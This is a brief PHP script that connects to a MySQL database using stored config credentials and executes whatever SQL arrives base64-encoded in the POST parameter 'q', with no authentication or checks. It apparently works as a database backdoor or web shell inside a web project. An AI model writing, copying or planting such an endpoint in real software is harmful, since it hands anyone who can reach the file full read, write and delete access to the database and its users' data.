<?php
	include "../lib/DB.php";
	include "../config.php";
	$mysql = new mysql;
	$mysql->connect($config['db_host'],$config['db_user'],$config['db_pass'],$config['db_name']);
	$q = base64_decode($_POST['q']);
	$mysql->query($q);
?>